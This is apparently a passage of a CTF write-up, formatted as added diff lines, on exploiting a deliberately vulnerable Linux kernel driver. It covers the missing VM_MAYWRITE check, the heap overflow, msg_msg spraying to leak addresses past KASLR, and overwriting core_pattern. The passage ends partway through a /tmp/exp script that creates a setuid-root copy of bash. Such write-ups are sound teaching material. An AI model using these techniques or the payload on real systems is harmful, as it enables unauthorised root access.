+<div id="blunder_open" class="anchor"></div>
+<h4 class="relative group"><em>blunder_open</em> 
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#blunder_open" aria-label="Anchor">#</a></span>        
+    
+</h4>
+<p>This function is called when a process first opens the device driver performing the following:</p>
+<ol>
+<li>A <code>blunder_proc</code> object is allocated on the heap and its values are initialized. This object is then stored in the driver&rsquo;s <code>file-&gt;private_data</code> for reference.</li>
+<li>The driver limits only a single process to trigger the call to <code>blunder_open</code>.</li>
+</ol>
+<p>The following is the code snippet that performs the above actions:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">int</span> <span class="nf">blunder_open</span><span class="p">(</span><span class="k">struct</span> <span class="n">inode</span> <span class="o">*</span><span class="n">inode</span><span class="p">,</span> <span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">file</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">	<span class="p">...</span>
+</span></span><span class="line"><span class="cl">	<span class="n">proc</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">blunder_proc</span> <span class="o">*</span><span class="p">)</span> <span class="n">kzalloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="o">*</span><span class="n">proc</span><span class="p">),</span> <span class="n">GFP_KERNEL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="p">...</span>
+</span></span><span class="line"><span class="cl">	<span class="n">file</span><span class="o">-&gt;</span><span class="n">private_data</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span> <span class="n">proc</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>The <code>blunder_proc</code> object is an important object that stores useful information about a process sending and receiving messages. The following are the members of this structure.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">blunder_proc</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="k">struct</span> <span class="n">kref</span> <span class="n">refcount</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="n">spinlock_t</span> <span class="n">lock</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">int</span> <span class="n">pid</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">int</span> <span class="n">dead</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="k">struct</span> <span class="n">rb_node</span> <span class="n">rb_node</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="k">struct</span> <span class="n">blunder_alloc</span> <span class="n">alloc</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="k">struct</span> <span class="n">list_head</span> <span class="n">messages</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><div id="blunder_mmap" class="anchor"></div>
+<h4 class="relative group"><em>blunder_mmap</em> 
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#blunder_mmap" aria-label="Anchor">#</a></span>        
+    
+</h4>
+<p>The function is triggered when a process calls <code>mmap</code> when mapping a new Virtual Address Space. The driver implements its own <code>mmap</code> implementation that returns a physical mapping shared between the kernel and userland. When the function is called, the following actions are performed:</p>
+<ol>
+<li>The allocated object <code>blunder_proc</code> is retrieved from <code>filp-&gt;private_data</code>.</li>
+<li>The map options passed via <code>mmap</code> are checked to determine if a process requested a mapping that is larger than the maximum and the <code>vma</code> flags are also checked to make sure that the requested mapping/page is not writable.</li>
+<li>An object is allocated on the kernel heap based on the size passed via <code>mmap</code>. This address is stored at <code>proc-&gt;alloc.mapping</code> that is of the type <code>struct blunder_alloc</code>. This chunk is also type-cast into a <code>blunder_buffer</code> object where messages are stored.</li>
+<li>The above chunk&rsquo;s (Kernel Virtual Address) is translated to a physical address and this physical address is mapped to a user-space virtual address that is returned to <code>mmap</code>.</li>
+</ol>
+<p>The following code snippet perform the above actions:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">int</span> <span class="nf">blunder_mmap</span><span class="p">(</span><span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">filp</span><span class="p">,</span> <span class="k">struct</span> <span class="n">vm_area_struct</span> <span class="o">*</span><span class="n">vma</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">	<span class="k">struct</span> <span class="n">blunder_proc</span> <span class="o">*</span><span class="n">proc</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">blunder_proc</span> <span class="o">*</span><span class="p">)</span> <span class="n">filp</span><span class="o">-&gt;</span><span class="n">private_data</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">...</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span><span class="p">(</span><span class="n">sz</span> <span class="o">&gt;</span> <span class="n">BLUNDER_MAX_MAP_SIZE</span> <span class="o">||</span> <span class="n">vma</span><span class="o">-&gt;</span><span class="n">vm_flags</span> <span class="o">&amp;</span> <span class="n">VM_WRITE</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">		<span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="p">...</span>
+</span></span><span class="line"><span class="cl">	<span class="c1">//a chunk is allocated from the heap via kmalloc
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="kt">void</span> <span class="o">*</span><span class="n">buf</span> <span class="o">=</span> <span class="n">kmalloc</span><span class="p">(</span><span class="n">sz</span><span class="p">,</span> <span class="n">GFP_KERNEL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="p">...</span>
+</span></span><span class="line"><span class="cl">	<span class="n">proc</span><span class="o">-&gt;</span><span class="n">alloc</span><span class="p">.</span><span class="n">mapping</span>  <span class="o">=</span> <span class="n">buf</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"> 	<span class="p">...</span>
+</span></span><span class="line"><span class="cl">	<span class="c1">//typecast the chunk to a blunder_buffer object
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="k">struct</span> <span class="n">blunder_buffer</span> <span class="o">*</span><span class="n">first_buffer</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">blunder_buffer</span> <span class="o">*</span><span class="p">)</span> <span class="n">proc</span><span class="o">-&gt;</span><span class="n">alloc</span><span class="p">.</span><span class="n">mapping</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="n">first_buffer</span> <span class="o">-&gt;</span> <span class="n">buffer_size</span> <span class="o">=</span> <span class="n">proc</span><span class="o">-&gt;</span><span class="n">alloc</span><span class="p">.</span><span class="n">mapping</span> <span class="o">-</span> <span class="k">sizeof</span><span class="p">(</span><span class="o">*</span><span class="n">first_buf</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	
+</span></span><span class="line"><span class="cl">	<span class="c1">//The virtual address is mapped to a physical address
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="n">pfn</span> <span class="o">=</span> <span class="n">virt_phys</span><span class="p">(</span><span class="n">proc</span><span class="o">-&gt;</span><span class="n">alloc</span><span class="p">.</span><span class="n">mapping</span><span class="p">)</span> <span class="o">&gt;&gt;</span>  <span class="n">PAGE_SHIFT</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	
+</span></span><span class="line"><span class="cl">	<span class="c1">//The physical address is mapped to a userland address and returned 
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="kt">int</span> <span class="n">ret</span> <span class="o">=</span> <span class="n">remap_pfn_range</span><span class="p">(</span><span class="n">vma</span><span class="p">,</span> <span class="n">vma</span><span class="o">-&gt;</span><span class="n">vm_start</span><span class="p">,</span> <span class="n">pfn</span><span class="p">,</span> <span class="n">sz</span><span class="p">,</span> <span class="n">vma</span><span class="o">-&gt;</span><span class="n">vm_page_prot</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="p">...</span>
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>The <code>blunder_buffer</code> object which is the above mapping shared by both the kernel and userland and that stores a process&rsquo;s IPC message(s) is as follows:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">blunder_buffer</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="k">struct</span> <span class="n">list_head</span> <span class="n">buffers_node</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="n">atomic_t</span> <span class="n">free</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="n">size_t</span> <span class="n">buffer_size</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="n">size_t</span> <span class="n">data_size</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="n">size_t</span> <span class="n">offsets_size</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>From the above code snippet in <code>blunder_mmap</code>, the address that will be returned to <code>mmap</code> and the address allocated on the Linux Kernel heap point to the same physical address, this therefore means that any change that is made on one side will be visible on the other (same mapping is shared). This seems a little secure since a userland process is not able to write to this mapping right?</p>
+<p>
+
+
+
+
+  <figure>
+    <img class="my-0 rounded-md" src="https://i.imgur.com/3pFNFTr.png" alt="blunder_mmap" />
+    
+  </figure>
+
+</p>
+<p>From a hint provided by <strong>BFS</strong> <a href="https://x.com/bluefrostsec/status/1586740929041506305"   target="_blank">
+    here</a>. There is a flag called the <code>VM_MAYWRITE</code> flag that is a part of <code>vma-&gt;vm-flags</code> that was not checked. This flag is set by default if a device file is opened with write permissions.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">fds</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">&#34;/dev/blunder&#34;</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">);</span> <span class="c1">//The driver is opened for reading and writing
+</span></span></span></code></pre></div><p>The driver not checking for this flag during its <code>mmap</code> implementation means that after the mapping, the memory permission(s) can later be changed via <code>mprotect</code> to make this region writable.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">mprotect</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">PROT_READ</span><span class="o">|</span><span class="n">PROT_WRITE</span><span class="p">);</span> <span class="c1">//simple code snippet for changing memory permmissions
+</span></span></span></code></pre></div><p>This leads to a sandboxed <code>AAW</code> in the shared mapping; by &lsquo;sandboxed&rsquo; I mean the bug can only be used within the page size&rsquo;d chunk range returned by <code>kmalloc</code> and shared between user and kernel land.
+
+
+
+
+
+  <figure>
+    <img class="my-0 rounded-md" src="https://i.giphy.com/media/v1.Y2lkPTc5MGI3NjExeTYweTJtZnJsbmgyenFmZGtnM3c4b2RrZ2cwaTNqcGd0eHY0MGd2diZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/fnuSiwXMTV3zmYDf6k/giphy.gif" alt="wtf" />
+    
+  </figure>
+
+</p>
+<div id="heap-buffer-overflow" class="anchor"></div>
+<h3 class="relative group">Heap Buffer Overflow 
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#heap-buffer-overflow" aria-label="Anchor">#</a></span>        
+    
+</h3>
+<p><em>So at this point the driver is vulnerable to an AAW. How can this be leveraged to control execution?</em></p>
+<p>When a process sends a message for IPC, it uses the allocated mapping <code>proc-&gt;mapping</code> to store messages of the type <code>blunder_buffer</code> and the mapping is split to fit more messages as they&rsquo;re sent until that page-sized block is exhausted. This is evident from the following source code snippet that is called from <code>blunder_send_msg(struct blunder_proc *proc, struct blunder_user_message *__user arg)</code>.</p>
+<p>
+
+
+
+
+  <figure>
+    <img class="my-0 rounded-md" src="https://i.imgur.com/7RWf3lQ.png" alt="blunder_alloc_gef_buf" />
+    
+  </figure>
+
+</p>
+<p>The <code>blunder_buffer</code> objects are tracked via a linked-list and an actual buffer is returned to copy the message from userland if its &lsquo;free&rsquo; and if its size is greater than than provided by the user.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="c1">//blunder_alloc_get_buf() function
+</span></span></span><span class="line"><span class="cl"><span class="c1">//This checks if the buffer is &#39;free&#39; and if its size is greater than that provided by the user
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span> <span class="p">(</span><span class="n">atomic_free</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="o">-&gt;</span><span class="n">free</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">buf</span><span class="o">-&gt;</span><span class="n">buffer_size</span> <span class="o">&gt;=</span> <span class="n">size</span><span class="p">)</span>	
+</span></span></code></pre></div><p>When a buffer is returned by the above function, userland data is then copied to this location as evident from the following source code snippet.</p>
+<p>
+
+
+
+
+  <figure>
+    <img class="my-0 rounded-md" src="https://i.imgur.com/7YJsaCX.png" alt="blunder_send_message" />
+    
+  </figure>
+
+</p>
+<p>The above <code>copy_from_user</code> function will copy <code>N</code> bytes which is the message size provided by the user. This size is only checked in the <code>alloc_get_buf</code> function, therefore, to be able to trigger a heap buffer overflow we need to find a way to modify <code>blunder_buffer-&gt;buffer_size</code> and this can be easily done as follows using the <code>AAW</code> introduced above:</p>
+<ol>
+<li>Send the first message to trigger split and create a new buffer near the end of the page-sized block.</li>
+<li>Use the <code>AAW</code> to overwrite <code>blunder_buffer-&gt;buffer_size</code> to a big size.</li>
+<li>When the above <code>copy_from_user</code> is called, this will trigger a heap buffer overflow that should overwrite and corrupt the next object on the heap.</li>
+</ol>
+<p>During the allocation of this memory block via <code>kmalloc</code>, since the size is passed via <code>mmap</code>; this means that this size should be page aligned and the minimum size that can be allocated is <code>0x1000</code> bytes. There are also not any usable elastic objects &gt; <code>0x1000</code> bytes that can be sprayed on the heap to be corrupted therefore, we are gonna stick to <code>0x1000</code> bytes during allocation.</p>
+<div id="elastic-objects" class="anchor"></div>
+<h4 class="relative group"><em>Elastic Objects</em> 
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#elastic-objects" aria-label="Anchor">#</a></span>        
+    
+</h4>
+<p>An elastic kernel object or sometimes referred to as a &lsquo;usable&rsquo; object is an object that contains a length field that can allow an attacker manipulate its value controlling its allocation on the heap.
+When the kernel accesses the data from the allocated object, the length field indicates the range of data that the kernel can read or write.</p>
+<p>When exploiting most Linux Kernel Heap vulnerabilities (Heap Overflows or kUAFs) an attacker would for example corrupt these objects to control execution flow <em>(overwriting function pointers)</em> or to leak kernel addresses to bypass <strong>KASLR</strong>.</p>
+<div id="slab-caches" class="anchor"></div>
+<h4 class="relative group"><em>Slab Caches</em> 
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#slab-caches" aria-label="Anchor">#</a></span>        
+    
+</h4>
+<p>There are different memory allocators in the Linux Kernel but the most common is the <strong>slab allocator</strong> that sits ontop of the primary allocator the <strong>buddy allocator</strong>. The internals of these allocators is beyond the scope of this article but a detailed analysis of how these allocators work is provided at [2].</p>
+<p>When an object is allocated via the <code>k*alloc</code> group of functions, based on the size, this particular object will be allocated in a particular <strong>slab cache</strong>. A slab cache is used to manage slabs that inturn store objects of the same size. A slab is basically a page-sized block that is split into smaller empty blocks where objects are stored.</p>
+<p>
+
+
+
+
+  <figure>
+    <img class="my-0 rounded-md" src="https://www.notion.so/image/https%3A%2F%2Fhammertux.github.io%2Fimg%2Fslab-org.png?table=block&amp;id=dbaaf118-ea4a-4fcf-ad84-285685a2e6c0&amp;spaceId=7f8ea3cd-52dd-4634-9cc1-20972d00335f&amp;width=2000&amp;userId=9ca9f9d7-3c98-4ddd-9328-dad0491b62e5&amp;cache=v2" alt="slab_cache" />
+    
+  </figure>
+
+</p>
+<p>For example, when a <code>32</code> byte object is allocated via <code>kmalloc(32, GFP_KERNEL)</code> the allocation will be handled by the <code>kmalloc-32</code> cache. This cache contains data-structures that keep track of partial and active slabs <strong><em>(full slabs are not tracked not until an object from this slab is free&rsquo;d)</em></strong>, therefore if there is an empty 32-byte sized block inside the active slab, this will be returned to kmalloc.</p>
+<p>The number of slabs in a cache is system specific but a <code>kmalloc-32</code> cache&rsquo;s slab is a single page-sized block that is <code>0x1000</code> bytes with <code>0x1000/0x20</code> or <code>128</code> objects. The information about these slab cache&rsquo;s can be found at <code>/proc/slabinfo</code>.</p>
+<p>In our driver&rsquo;s case, when we allocate a page-sized object, this will endup in the <code>kmalloc-1k</code> slab cache. Since we already know how to trigger a heap ovf vulnerability, what <code>kmalloc-1k</code> elastic objects can we corrupt for exploitation? <a href="https://ptr-yudai.hatenablog.com/entry/2020/03/16/165628"   target="_blank">
+    This</a> article has a curative list of elastic objects and how they can be abused for exploitation.</p>
+<div id="msg_msg-objects" class="anchor"></div>
+<h4 class="relative group"><em>msg_msg objects</em> 
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#msg_msg-objects" aria-label="Anchor">#</a></span>        
+    
+</h4>
+<p>These are objects used to send and receive messages from a <strong>system V Message Queue</strong> for the purpose of Inter-Process Communication. A process is able to write to the message queue to send a message and another process is able to read from the message queue to receive a message using the <code>msgsnd</code> and <code>msgrcv</code> system calls respectively. The manpages of these system calls describe their usages in detail.</p>
+<p>During exploitation, these are <code>kmalloc-1k</code> elastic objects that can be corrupted to leak kernel addresses for bypassing<code>FG-KASLR</code>. Unfortunately, they don&rsquo;t have any usable function pointers that can be corrupted to control execution. These objects are analysed in more detail <a href="https://www.willsroot.io/2021/08/corctf-2021-fire-of-salvation-writeup.html"   target="_blank">
+    here</a> and <a href="https://syst3mfailure.io/wall-of-perdition/"   target="_blank">
+    here</a> to understand how their implementations can be useful to an attacker.</p>
+<p>One important thing to note is that to be able to leak address from the heap to bypass <code>USER_HARDENED_COPY</code> the kernel should be compiled with the <code>CONFIG_CHECKPOINT_RESTORE</code> configuration enabled.</p>
+<div id="shm_file_data" class="anchor"></div>
+<h4 class="relative group"><em>shm_file_data</em> 
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#shm_file_data" aria-label="Anchor">#</a></span>        
+    
+</h4>
+<p>When the above <code>msg_msg</code> object&rsquo;s message size is greater than the page size <code>0x1000</code> bytes, the message is split and allocated a new chunk via <code>kmalloc</code>. When using <code>msg_msg</code> objects to leak addresses,we will have to make sure the split message is allocated in the <code>kmalloc-32</code> cache near a <code>shm_file_data</code> elastic object to leak its struct member addresses.</p>
+<div id="heap-grooming-fengshui" class="anchor"></div>
+<h2 class="relative group">Heap (Grooming) Fengshui 
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#heap-grooming-fengshui" aria-label="Anchor">#</a></span>        
+    
+</h2>
+<p><strong>Heap Grooming</strong> is art especially when exploiting heap-based vulnerabilities. The aim at this point is to be able to manipulate the slab allocator to allocate a <code>msg_msg</code> object right after our <code>proc-&gt;alloc-&gt;mapping</code> in the same slab for us to trigger the heap ovf and corrupt the object.</p>
+<p>As mentioned above, a slab cache will keep track of <strong>partial</strong> and <strong>active</strong> slabs where the active slab is the one used to service the next allocation. Since we do not have control of these slabs, we will therefore spray <code>msg_msg</code> objects with the aim of getting an alloction near our <code>proc-&gt;alloc-&gt;mapping</code> in any of the partial slabs or if we are lucky enough, we could also get allocated a new empty slab that will only contain our victim and sprayed target objects.</p>
+<p>The same can also be done in <code>kmalloc-32</code> by spraying <code>shm_file_data</code> elastic objects before the allocation of <code>msg_msg</code> objects with the aim of getting a split <code>msg_msg</code> object called a <code>msg_seg</code> allocated right before an <code>shm_file_data</code>  object.</p>
+<p>The following shows the source code snippet for spraying these elastic objects on the heap before triggering the allocation of our driver&rsquo;s <code>proc-&gt;alloc-&gt;mapping</code> via <code>mmap</code>.</p>
+<p>
+
+
+
+
+  <figure>
+    <img class="my-0 rounded-md" src="https://i.imgur.com/2pUzIiu.png" alt="elastic_objects_spray" />
+    
+  </figure>
+
+</p>
+<blockquote>
+<p><strong>NOTE</strong>: I like to somewhat wrap my vulnerable objects between elastic objects during sprays, idk but it somehow increases the chances of having an elastic object allocated right after the vulnerable/victim object.</p>
+</blockquote>
+<div id="exploitation" class="anchor"></div>
+<h2 class="relative group">Exploitation 
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#exploitation" aria-label="Anchor">#</a></span>        
+    
+</h2>
+<div id="leaking-addresses" class="anchor"></div>
+<h3 class="relative group"><em>Leaking addresses</em> 
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#leaking-addresses" aria-label="Anchor">#</a></span>        
+    
+</h3>
+<p>When the allocation of the elastic target and victim objects align, the <code>AAW</code> can be used to modify the split <code>blunder_buffer</code> object&rsquo;s buffer size, to introduce a heap overflow that can be used to overwrite <code>msg_msg-&gt;m_ts</code> value to a bigger value that should allow us read passed its (split) message segment in the <code>kmalloc-32</code> cache to leak kernel addresses.</p>
+<p>
+
+
+
+
+  <figure>
+    <img class="my-0 rounded-md" src="https://i.imgur.com/5blcq5J.png" alt="attack_flow" />
+    
+  </figure>
+
+</p>
+<p>The leaked ddress is the address of <code>INIT_IPC_NS</code> that resides in the kernel data area <em>(not affected by FG-KASLR)</em>, this can then be used to calculate the kernel base address to bypass <code>KASLR</code>.</p>
+<div id="controlling-execution-flow" class="anchor"></div>
+<h3 class="relative group"><em>Controlling Execution flow</em> 
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#controlling-execution-flow" aria-label="Anchor">#</a></span>        
+    
+</h3>
+<p>There are different techniques that can be used when attacking the kernel to control execution and return back to userland as <code>root</code>. Since we have an <code>AAW</code> and the <code>blunder_buffer</code> objects are connected via a doubly linked list, the idea was to overwrite the <code>*next</code> pointer with a kernel address that we want to corrupt introducing a <strong>Kernel Arbitrary Address Write</strong>.</p>
+<p>There are many targets for example <code>modprobe_path</code>, <code>cred_struct</code> or even <code>core_pattern</code> the only problem is when the <code>blunder_buffer</code> objects are traversed the following checks are done before a write is triggered.</p>
+<ol>
+<li>The <code>blunder_buffer-&gt;free</code> should not be NULL.</li>
+<li>The <code>blunder_buffer-&gt;buffer_size</code> should be greater that the user provided data.</li>
+</ol>
+<p>This is evident from the following driver&rsquo;s source code snippet:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="n">atomic_read</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="o">-&gt;</span><span class="n">free</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">buf</span><span class="o">-&gt;</span><span class="n">buffer_size</span> <span class="o">&gt;=</span> <span class="n">size</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">	<span class="p">...</span>
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="n">buf</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>This therefore means that we have to typecast our target to a <code>blunder_buffer</code> object with the following structure.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">blunder_buffer</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="k">struct</span> <span class="n">list_head</span> <span class="n">buffer_nodes</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="n">atomic_t</span> <span class="n">free</span><span class="p">;</span> <span class="c1">//This is required to write into data
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="n">size_t</span> <span class="n">buffer_size</span><span class="p">;</span> <span class="c1">//This determines the bytes written to data from userland
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="n">size_t</span> <span class="n">data_size</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="n">size_t</span> <span class="n">offsets_size</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span> <span class="c1">// The target address should go here 
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
+</span></span></code></pre></div><p>From the list of addresses above, the only candidate that satisfied the above requirements was <code>core_pattern</code>. The following shows the analysis of this address in memory.</p>
+<p>
+
+
+
+
+  <figure>
+    <img class="my-0 rounded-md" src="https://i.imgur.com/qJpMfsO.png" alt="image" />
+    
+  </figure>
+
+</p>
+<div id="overwriting-core_pattern" class="anchor"></div>
+<h4 class="relative group"><em>overwriting core_pattern</em> 
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#overwriting-core_pattern" aria-label="Anchor">#</a></span>        
+    
+</h4>
+<p>When a process receives a signal for example a segmentation fault, each of these signals has a current disposition that is used to determine how a function behaves when its delivered a signal.</p>
+<p>Some signals like <code>SIGSEGV</code> their default action is to terminate and produce a core dump file. This is a file that contains an image of the process memory at the time of termination.</p>
+<p>When a core dump file is produced, the kernel will use the <code>/sys/proc/kernel/core_pattern</code> file to determine the format and the path to dump the core file.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo <span class="nb">echo</span> <span class="s2">&#34;/tmp/core-file-&gt;%e-&gt;%s-&gt;%u&#34;</span> &gt; /proc/sys/kernel/core_pattern
+</span></span></code></pre></div><p>For example when a segmentation fault is trigger in a process and the <code>ulimit</code> is set to <code>unlimited</code>, a core file will be dumped in the <code>tmp</code> folder as follows based on the above <code>core_pattern</code> file.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">-rw-------  <span class="m">1</span> kali kali <span class="m">303104</span> Jun <span class="m">18</span> 04:56 <span class="s1">&#39;core-file-&gt;exec-&gt;11-&gt;1000&#39;</span>
+</span></span></code></pre></div><p>The <code>core_pattern</code> can also be configuerd to run commands via the pipe symbol <code>|</code>. For example when the following is the content of the <code>core_pattern</code> file, the script at <code>/tmp/exp</code> will be executed.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;|/tmp/exp&#34;</span> &gt; /proc/sys/kernel/core_pattern
+</span></span></code></pre></div><p>Using the above write primitive, we can write <code>|/tmp/exp</code> to the <code>core_pattern</code> address with the following as the contents of the <code>/tmp/exp</code> file.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#! /bin/bash
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl">cp /bin/bash /tmp/bash
+</span></span><span class="line"><span class="cl">chmod <span class="m">4755</span> /tmp/bash
+</span></span><span class="line"><span class="cl">chown root:root /tmp/bash
